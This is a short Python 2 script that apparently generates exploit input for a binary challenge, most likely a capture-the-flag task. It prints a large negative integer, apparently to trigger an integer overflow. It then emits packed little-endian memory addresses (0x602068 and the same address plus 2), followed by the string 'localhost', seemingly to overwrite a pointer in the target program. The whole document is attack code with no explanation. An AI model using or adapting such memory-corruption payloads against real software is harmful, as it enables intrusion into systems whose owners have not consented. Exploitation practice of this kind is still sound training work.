#!/usr/bin/env python2

import sys, os, struct

def pk(s):
    return struct.pack('<Q', s)

def p(s):
    sys.stdout.write(s)
    sys.stdout.flush()

for i in range(2):
    print -4294866532
    s = pk(0x602068) + pk(0x602068 + 2)
    s += 'localhost'

    p(s + '\n')
